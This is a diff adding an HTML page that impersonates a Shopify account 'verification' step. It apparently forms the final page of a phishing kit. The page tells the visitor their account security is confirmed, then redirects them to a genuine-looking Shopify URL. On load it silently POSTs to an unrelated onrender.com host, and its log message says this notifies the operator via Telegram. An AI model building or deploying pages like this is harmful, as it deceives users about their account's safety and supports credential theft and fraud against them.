@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thank You</title>
+    <link rel="icon" type="image/png" href="res/shopi.png">
+    <link rel="stylesheet" href="res/app.css">
+    <style>
+        .success-container {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            color: #4CAF50;
+        }
+        
+        .success-title {
+            color: #2E7D32;
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        
+        .success-message {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            font-size: 16px;
+        }
+        
+        .loading-container {
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4CAF50;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .countdown {
+            color: #4CAF50;
+            font-weight: bold;
+            font-size: 18px;
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .redirect-info {
+            background-color: #f5f5f5;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .redirect-url {
+            font-family: monospace;
+            background-color: #eee;
+            padding: 8px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 12px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>    
+
+<main>
+    <div class="form">
+        <div class="logo">
+            <img src="res/logo.png" alt="Logo">
+        </div>
+
+        <div class="success-container">
+            <div class="success-icon">✅</div>
+            <h1 class="success-title">Verification Complete!</h1>
+            
+            <div class="success-message">
+                Thank you for completing the verification process. Your account security has been successfully confirmed.
+            </div>
+            
+            <div class="loading-container">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Redirecting you to your account...</div>
+                <div class="countdown" id="countdown">12</div>
+            </div>
+            
+            <div class="redirect-info">
+                You will be automatically redirected to your Shopify account in <span id="seconds">12</span> seconds.
+                <div class="redirect-url">
+                    https://accounts.shopify.com/lookup?rid=b2554388-355a-4356-996b-9e5a8532a80b&verify=1769453902-DeJv56ymoRsCCBB9W51LB0vTw1ho82k49fn8SXk1aI8%3D
+                </div>
+            </div>
+            
+            <div style="margin-top: 30px;">
+                <button onclick="redirectNow()" style="padding: 10px 25px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                    Click here if not redirected automatically
+                </button>
+            </div>
+        </div>
+
+        <div class="col links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
+    </div>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+<script>
+const redirectUrl = "https://accounts.shopify.com/lookup?rid=b2554388-355a-4356-996b-9e5a8532a80b&verify=1769453902-DeJv56ymoRsCCBB9W51LB0vTw1ho82k49fn8SXk1aI8%3D";
+let countdown = 12;
+let countdownInterval;
+
+function startCountdown() {
+    countdownInterval = setInterval(function() {
+        countdown--;
+        $("#countdown").text(countdown);
+        $("#seconds").text(countdown);
+        
+        if (countdown <= 0) {
+            clearInterval(countdownInterval);
+            redirectNow();
+        }
+    }, 1000);
+}
+
+function redirectNow() {
+    clearInterval(countdownInterval);
+    window.location.href = redirectUrl;
+}
+
+// Start countdown when page loads
+$(document).ready(function() {
+    startCountdown();
+    
+    // Optional: Send feedback to backend (if you want to keep this feature)
+    const feedback = "User completed verification process";
+    
+    $.ajax({
+        url: 'https://shopy-fbwo.onrender.com/thks',
+        method: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            message: feedback
+        }),
+        success: function(response) {
+            console.log("Feedback sent to Telegram");
+        },
+        error: function() {
+            console.log("Failed to send feedback");
+        }
+    });
+});
+
+// Optional: Allow user to skip waiting
+$(document).keypress(function(e) {
+    if (e.key === 'Enter' || e.key === ' ') {
+        redirectNow();
+    }
+});
+</script>
+
+</body>
+</html>
